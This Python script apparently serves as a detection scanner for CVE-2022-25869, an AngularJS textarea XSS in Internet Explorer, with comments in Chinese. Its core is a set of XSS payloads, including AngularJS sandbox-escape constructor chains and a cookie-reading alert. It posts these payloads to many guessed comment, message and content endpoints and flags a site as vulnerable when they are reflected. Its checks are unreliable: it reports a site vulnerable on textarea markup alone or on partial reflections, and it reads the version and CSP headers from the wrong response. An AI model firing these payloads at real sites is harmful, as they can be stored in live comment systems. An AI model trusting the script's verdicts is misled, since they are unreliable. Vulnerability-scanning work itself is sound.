"""
CVE-2022-25869 Vulnerability Detection Script
AngularJS Internet Explorer XSS - CVSS 4.2 (Medium)
HeroDevs Vulnerability Directory - 最佳驗證路徑
影響版本: 所有 AngularJS 版本
"""

import requests
import re
from urllib.parse import urljoin

def scan(session, target_url):
    """
    掃描 CVE-2022-25869 弱點
    AngularJS Internet Explorer XSS 弱點
    最佳驗證路徑：測試 textarea 插值表達式在 IE 環境下的 XSS 利用
    """
    result = {
        'vulnerable': False,
        'evidence': '',
        'description': 'CVE-2022-25869: AngularJS Internet Explorer XSS 弱點，textarea 元素中的插值表達式可在 IE 瀏覽器中執行惡意腳本',
        'remediation': '更新到 AngularJS NES 1.9.0 或 1.5.16，避免在 textarea 中使用未清理的插值，實施嚴格的內容安全政策 (CSP)'
    }
    
    try:
        print("      [檢測] 正在檢查 CVE-2022-25869 IE XSS 弱點...")
        
        # Step 1: 檢測 AngularJS 和 textarea 使用
        response = session.get(target_url, timeout=30)
        
        angular_indicators = [
            'angular.js',
            'angular.min.js',
            'ng-app',
            'ng-controller',
            'angular.module'
        ]
        
        textarea_indicators = [
            '<textarea',
            'ng-model',
            'textarea interpolation',
            'ng-bind',
            'ng-bind-html',
            'contenteditable'
        ]
        
        uses_angular = any(indicator in response.text.lower() for indicator in angular_indicators)
        uses_textarea = any(indicator in response.text.lower() for indicator in textarea_indicators)
        
        if not uses_angular:
            result['evidence'] = "未檢測到 AngularJS 應用程式"
            return result
        
        print(f"      [檢測] 發現 AngularJS 應用程式，textarea 檢測: {'是' if uses_textarea else '否'}")
        
        # Step 2: 檢查現有頁面中的 textarea 和插值使用
        textarea_patterns = [
            r'<textarea[^>]*>.*?\{\{.*?\}\}.*?</textarea>',
            r'<textarea[^>]*ng-model[^>]*>.*?</textarea>',
            r'<textarea[^>]*ng-bind[^>]*>',
            r'<div[^>]*contenteditable[^>]*>.*?\{\{.*?\}\}.*?</div>',
            r'ng-model\s*=\s*["\'][^"\']*["\'][^>]*textarea'
        ]
        
        found_textarea_usage = []
        for pattern in textarea_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE | re.DOTALL)
            if matches:
                found_textarea_usage.extend(matches)
        
        if found_textarea_usage:
            print(f"      [檢測] 發現 {len(found_textarea_usage)} 個 textarea 插值使用")
        
        # Step 3: 構造 CVE-2022-25869 特定 IE XSS 攻擊負載
        # 基於 HeroDevs 技術分析：IE 瀏覽器中 textarea 插值的特殊處理
        ie_xss_payloads = [
            {
                'payload': '{{ constructor.constructor("alert(\'CVE-2022-25869\')")() }}',
                'description': 'IE constructor chain XSS',
                'ie_specific': True
            },
            {
                'payload': '{{ $eval("alert(document.domain)") }}',
                'description': 'IE $eval XSS exploitation',
                'ie_specific': True
            },
            {
                'payload': '{{ toString.constructor.prototype.toString.constructor.prototype.constructor("alert(1)")() }}',
                'description': 'IE prototype chain XSS',
                'ie_specific': True
            },
            {
                'payload': '{{ [].constructor.constructor("alert(\'IE-XSS\')")() }}',
                'description': 'IE array constructor XSS',
                'ie_specific': True
            },
            {
                'payload': '{{ ""["constructor"]["constructor"]("alert(1)")() }}',
                'description': 'IE string constructor XSS',
                'ie_specific': True
            },
            {
                'payload': '{{ $root.constructor.constructor("alert(document.cookie)")() }}',
                'description': 'IE $root scope XSS',
                'ie_specific': True
            },
            {
                'payload': '<script>alert("Direct-XSS")</script>',
                'description': 'Direct script injection test',
                'ie_specific': False
            }
        ]
        
        # Step 4: 測試支援文字輸入的 API 端點
        textarea_endpoints = [
            '/api/comment',
            '/api/message',
            '/api/feedback',
            '/api/post',
            '/api/review',
            '/api/note',
            '/comment/create',
            '/message/send',
            '/feedback/submit',
            '/post/create',
            '/review/add'
        ]
        
        general_endpoints = [
            '/api/content',
            '/api/text',
            '/api/data',
            '/api/input',
            '/content',
            '/text'
        ]
        
        all_endpoints = textarea_endpoints + general_endpoints
        
        print(f"      [檢測] 開始測試 {len(ie_xss_payloads)} 個 IE XSS 負載...")
        
        for endpoint in all_endpoints:
            try:
                # 檢查端點可用性
                test_response = session.get(urljoin(target_url, endpoint), timeout=10)
                if test_response.status_code == 404:
                    continue
                
                print(f"      [檢測] 測試端點: {endpoint}")
                
                for payload_data in ie_xss_payloads:
                    payload = payload_data['payload']
                    description = payload_data['description']
                    ie_specific = payload_data['ie_specific']
                    
                    try:
                        # 測試多種 textarea 相關參數
                        test_data = {
                            'comment': payload,
                            'message': payload,
                            'content': payload,
                            'text': payload,
                            'textarea_content': payload,
                            'description': payload,
                            'note': payload,
                            'feedback': payload
                        }
                        
                        print(f"      [檢測] 執行 {description}...")
                        
                        # 執行 POST 請求
                        response = session.post(
                            urljoin(target_url, endpoint),
                            data=test_data,
                            timeout=15
                        )
                        
                        # 檢查是否直接反映了 XSS payload
                        if response.status_code in [200, 201, 202]:
                            response_text = response.text
                            
                            # 檢查完整 payload 是否被反映 (未經清理)
                            if payload in response_text:
                                result['vulnerable'] = True
                                result['evidence'] = f"在端點 {endpoint} 發現 CVE-2022-25869 IE XSS 弱點！\n\n攻擊詳情:\n- 負載: {description}\n- IE 專用: {'是' if ie_specific else '否'}\n- XSS Payload: {payload}\n- 狀態: 完整反射未清理\n\n在 Internet Explorer 環境下，此 textarea 插值表達式可能被執行為 JavaScript 代碼，導致跨站腳本攻擊。攻擊者可利用此弱點竊取用戶憑證或執行惡意操作。"
                                return result
                            
                            # 檢查部分 payload 組件
                            xss_components = [
                                'constructor.constructor',
                                '$eval',
                                'alert(',
                                'document.domain',
                                'document.cookie',
                                'toString.constructor',
                                '$root.constructor'
                            ]
                            
                            found_components = [comp for comp in xss_components if comp in response_text]
                            
                            if found_components:
                                result['vulnerable'] = True
                                result['evidence'] = f"在端點 {endpoint} 發現部分 IE XSS 組件反射。{description} 中的危險組件被反映: {', '.join(found_components)}。這表明可能存在 textarea 插值 XSS 風險。"
                                return result
                        
                        # 測試 JSON 格式
                        json_data = {
                            'textarea': {
                                'content': payload
                            },
                            'message': {
                                'text': payload
                            },
                            'content': payload
                        }
                        
                        headers = {'Content-Type': 'application/json'}
                        response = session.post(
                            urljoin(target_url, endpoint),
                            json=json_data,
                            headers=headers,
                            timeout=15
                        )
                        
                        if response.status_code in [200, 201, 202]:
                            if payload in response.text:
                                result['vulnerable'] = True
                                result['evidence'] = f"在端點 {endpoint} 發現 IE XSS 弱點 (JSON 格式)。{description} 被完整反射。"
                                return result
                        
                        # 測試 GET 參數
                        get_params = {
                            'content': payload,
                            'text': payload,
                            'message': payload
                        }
                        
                        response = session.get(
                            urljoin(target_url, endpoint),
                            params=get_params,
                            timeout=15
                        )
                        
                        if response.status_code == 200:
                            if payload in response.text:
                                result['vulnerable'] = True
                                result['evidence'] = f"在端點 {endpoint} 發現 IE XSS 弱點 (GET 參數)。{description} 被反射。"
                                return result
                                
                    except Exception as e:
                        continue
                        
            except Exception as e:
                continue
        
        # Step 5: 分析現有頁面的 textarea 實作
        print("      [檢測] 分析現有頁面的 textarea 實作...")
        
        if found_textarea_usage:
            # 檢查危險的 textarea 模式
            dangerous_patterns = []
            for usage in found_textarea_usage:
                # 檢查是否有插值表達式
                if '{{' in usage and '}}' in usage:
                    dangerous_patterns.append(usage)
                # 檢查是否使用 ng-bind-html
                elif 'ng-bind-html' in usage.lower():
                    dangerous_patterns.append(usage)
                # 檢查是否有 contenteditable
                elif 'contenteditable' in usage.lower():
                    dangerous_patterns.append(usage)
            
            if dangerous_patterns:
                result['vulnerable'] = True
                result['evidence'] = f"在頁面中發現 {len(dangerous_patterns)} 個可能受 CVE-2022-25869 影響的 textarea 實作。發現包含插值表達式或動態內容綁定的 textarea 元素，在 Internet Explorer 環境下可能存在 XSS 風險。建議檢查這些實作並實施適當的內容清理。"
                return result
        
        # Step 6: 測試特定的 IE XSS 場景
        print("      [檢測] 測試特定 IE XSS 場景...")
        
        # 構造包含 textarea 的 HTML 測試
        ie_html_payloads = [
            '<textarea ng-model="userInput">{{ constructor.constructor("alert(1)")() }}</textarea>',
            '<textarea>{{ $eval("alert(document.domain)") }}</textarea>',
            '<div contenteditable="true">{{ toString.constructor.prototype.constructor("alert(1)")() }}</div>',
            '<textarea ng-bind-html="userContent">{{ [].constructor.constructor("alert(1)")() }}</textarea>'
        ]
        
        for payload in ie_html_payloads:
            for endpoint in ['/api/content', '/api/template', '/content', '/template']:
                try:
                    response = session.post(
                        urljoin(target_url, endpoint),
                        data={'html': payload, 'template': payload, 'content': payload},
                        timeout=10
                    )
                    
                    if response.status_code == 200:
                        # 檢查是否保留了危險的插值
                        if '{{' in response.text and '}}' in response.text:
                            if any(dangerous in response.text for dangerous in ['constructor', '$eval', 'alert(']):
                                result['vulnerable'] = True
                                result['evidence'] = f"在端點 {endpoint} 成功注入了 IE XSS textarea 內容，插值表達式被保留。"
                                return result
                                
                except:
                    continue
        
        # Step 7: 檢查 AngularJS 版本和 IE 相容性
        version_patterns = [
            r'angular\.version\s*=\s*["\']([0-9.]+)',
            r'angular[.-]([0-9.]+)\.(?:min\.)?js',
            r'AngularJS\s+v?([0-9.]+)'
        ]
        
        detected_version = None
        for pattern in version_patterns:
            match = re.search(pattern, response.text)
            if match:
                detected_version = match.group(1)
                print(f"      [檢測] 檢測到 AngularJS 版本: {detected_version}")
                break
        
        # 檢查 IE 相容性標誌
        ie_compatibility_indicators = [
            'X-UA-Compatible',
            'IE=edge',
            'IE=EmulateIE',
            'conditional comments',
            '<!--[if IE',
            'navigator.userAgent',
            'MSIE',
            'Trident'
        ]
        
        ie_compatible = any(indicator in response.text for indicator in ie_compatibility_indicators)
        
        if ie_compatible:
            print("      [檢測] 檢測到 IE 相容性設定")
        
        # Step 8: 檢查內容安全政策 (CSP)
        csp_header = response.headers.get('Content-Security-Policy', '')
        x_csp_header = response.headers.get('X-Content-Security-Policy', '')
        
        csp_protection = False
        if csp_header or x_csp_header:
            csp_content = (csp_header + ' ' + x_csp_header).lower()
            if "'unsafe-inline'" not in csp_content and "'unsafe-eval'" not in csp_content:
                csp_protection = True
                print("      [檢測] 發現有效的 CSP 保護")
        
        # Step 9: 測試輕量級 textarea 插值
        print("      [檢測] 執行輕量級 textarea 插值測試...")
        
        simple_interpolations = [
            '{{ 7*7 }}',
            '{{ "test" }}',
            '{{ userInput }}',
            '{{ message.text }}'
        ]
        
        for interpolation in simple_interpolations:
            for endpoint in ['/api/test', '/test', '/api/comment']:
                try:
                    response = session.post(
                        urljoin(target_url, endpoint),
                        data={'content': interpolation, 'textarea': interpolation},
                        timeout=5
                    )
                    
                    if response.status_code == 200:
                        # 檢查插值是否被處理或保留
                        if interpolation in response.text:
                            print(f"      [檢測] 在 {endpoint} 發現插值表達式被保留")
                        elif '49' in response.text and '7*7' in interpolation:
                            print(f"      [檢測] 在 {endpoint} 發現插值表達式被執行")
                            
                except:
                    continue
        
        # 最終結果評估
        risk_factors = []
        
        if found_textarea_usage:
            risk_factors.append(f"{len(found_textarea_usage)} 個 textarea 使用")
        
        if ie_compatible:
            risk_factors.append("IE 相容性設定")
        
        if detected_version:
            risk_factors.append(f"AngularJS 版本 {detected_version}")
        
        if not csp_protection:
            risk_factors.append("缺乏有效的 CSP 保護")
        
        if risk_factors:
            result['evidence'] = f"檢測摘要: CVE-2022-25869 風險因素包括: {', '.join(risk_factors)}。雖未發現明確的 XSS 攻擊成功，但在 Internet Explorer 環境下，textarea 插值表達式仍可能存在安全風險。建議更新到安全版本並實施 CSP 保護。"
        else:
            result['evidence'] = f"完成 CVE-2022-25869 檢測。測試了 {len(all_endpoints)} 個端點和 {len(ie_xss_payloads)} 個 IE XSS 負載，分析了 {len(found_textarea_usage)} 個 textarea 實作，未發現明確的 XSS 弱點。"
        
    except Exception as e:
        result['evidence'] = f"掃描過程中發生錯誤: {str(e)}"
    
    return result